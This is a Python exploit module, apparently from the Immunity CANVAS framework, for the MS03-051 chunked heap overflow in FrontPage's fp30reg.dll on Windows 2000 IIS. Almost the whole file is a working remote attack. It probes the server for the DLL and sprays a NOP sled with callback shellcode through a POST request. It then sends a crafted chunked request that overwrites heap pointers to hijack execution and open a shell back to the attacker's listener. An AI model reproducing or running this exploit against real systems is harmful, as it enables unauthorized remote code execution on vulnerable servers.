#! /usr/bin/env python
"""
fp30reg.py

Exploits Brett Moore's heap overflow (chunked, etc) in fp30reg.dll

fp30reg.py is typically installed in /_vti_bin/_vti_aut/fp30reg.dll by Visual Studio

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

#note: Both UUIDs listed are vulnerable, but one is only there after it has
#been tickled from localhost. So we use the other one.

VERSION="1.0"
NOTES="""


"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
 
"""

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

        
import socket
from exploitutils import *
sys.path.append('encoder')
import addencoder
import chunkedaddencoder
sys.path.append("shellcode")
import win32shell
sys.path.append("gui")

from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

NAME="FP30REG Chunked Heap Overflow (MS03-051)"
DESCRIPTION="FP30REG.DLL Chunked Heap Overflow (MS03-051)"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="10/01/2003"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2003-0822"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0822"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/bulletin/ms03-051.mspx"

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV'] = "ms03-051"

GTK2_DIALOG="dialog.glade2"

NOTES=""" 

"""

CHANGELOG="""

"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit




class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(80)
        self.setHost("")
        self.setVersion(0)
        self.badstring=""
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.tag1="AACC"
        self.tag2="ACCB"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.name=NAME
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        """Create a standard callback shellcode"""
        
        localhost=self.callback.ip
        localport=self.callback.port
        
        if self.version==0:
            self.localhost=localhost
            self.localport=localport
            return "No need to create shellcode yet"

        
        self.log("Creating shellcode for version %s"%self.version)
        self.log("Calling back to %s:%s"%(localhost,localport))

        self.createWin32SearchShellcode(localhost,localport)

        self.log("length of real shellcode: %d"%(len(self.shellcode)))

        return 1

    def test(self):
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return self.runTest()
    
    def runTest(self):
        try:
            s=self.gettcpsock()
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))        
        except:
            self.log("Couldn't initialize the server")
            return 0
        
        data="GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.0\r\n\r\n"
        self.websend(s,data)
        data=self.webrecv(s)
        data+=self.webrecv(s)
        self.log("Server returned: %s"%data)

        if data.count("Not Implemented"):
            note=""" This is normal:
            Server returned: HTTP/1.1 501 Not Implemented
            Server: Microsoft-IIS/5.0
            Date: Mon, 22 Sep 2003 16:15:09 GMT
            X-Powered-By: ASP.NET
            Content-Type: text/html
            
            <HEAD><TITLE>HTTP Error 501</TITLE></HEAD><BODY><H1>NOT IMPLEMENTED</H1>The server is unable to perform the method <b></b> at this time.</BODY>
            </body></html>
            """
            #fp30reg was found
            self.log("fp30reg.dll was found!")
            self.version=1
            return 1
        
        if data.count("The specified module could not be found."):
            #fp30reg was found
            self.log("fp30reg.dll was not found!")
            self.version=0
            return 0
        return 0

    def putshellcode(self):
        body="\x90"*40000+self.shellcode
        sploitstring="POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n"
        sploitstring+="Host: %s\r\n"%self.host
        sploitstring+="Content-Length: %d\r\n"%(len(body))
        sploitstring+="\r\n"
        sploitstring+=body
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            data=self.webrecv(s)
            data+=self.webrecv(s)
            data+=self.webrecv(s)
            self.log("Server returned: %s"%data)
            s.close()
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            return 0
        return 1

    def run(self):
        
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        #print "Self.version=%d"%self.version
        if self.version==0:
            if self.runTest()==0:
                self.log("Not continuing since no fp30reg.dll was found")
                return 0
            else:
                self.createShellcode()
        self.putshellcode()


        sploitstring=self.makesploit()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            self.log("Reading...")
            data=""
            tmp="A"
            while tmp!="":
                tmp=self.webrecv(s)
                data+=tmp
            self.log("Server returned: %s"%data)

            s.close()
        except:
            self.log("Attack reported no open socket - service died?")
        time.sleep(1)
        return self.ISucceeded()
       

    def setVersions(self):
        self.versions={}
        #version array: name EIP ECX
        #7ffdf0d0 is in PEB, e0ff4242 is a JMP EAX 
        self.versions[1]=("Windows 2000", 0x7ffdf0d0L,0xe0ff0804L) 
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def makesploit(self):
        self.log("Attacking version %s"%self.versions[self.version][0])
        body="A"*0x23c
        EIP=self.versions[self.version][1]
        ECX=self.versions[self.version][2]
        
        #why is this necessary to trigger the overflow?
        body=stroverwrite(body,"A"*4+"B"*4+"C"*4+"D"*4,0)
        #heap structure
        body=stroverwrite(body,intel_order(ECX),16)
        body=stroverwrite(body,intel_order(EIP-4),20)
        #our function pointer that we overwrite...
        body=stroverwrite(body,"\xeb\x04",262)
        #if debug:
        #body=stroverwrite(body,intel_order(0x01020304),264)
        #else:
        body=stroverwrite(body,"\xeb\x04",114)        
        body=stroverwrite(body,intel_order(EIP),116)
        body=stroverwrite(body,intel_order(EIP),264)
        body=stroverwrite(body,self.encodedsearchcode,268)

        packet=""
        packet+="POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n"
        packet+="Host: %s\r\n"%self.host
        packet+="Connection: keep-alive\r\n"
        packet+="Transfer-Encoding: chunked\r\n\r\n"
        packet+="%x\r\n"%len(body)
        packet+="%s\r\n0\r\n\r\n"%body
        #self.log("Attack packet=%s"%packet)
        return packet
        
if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

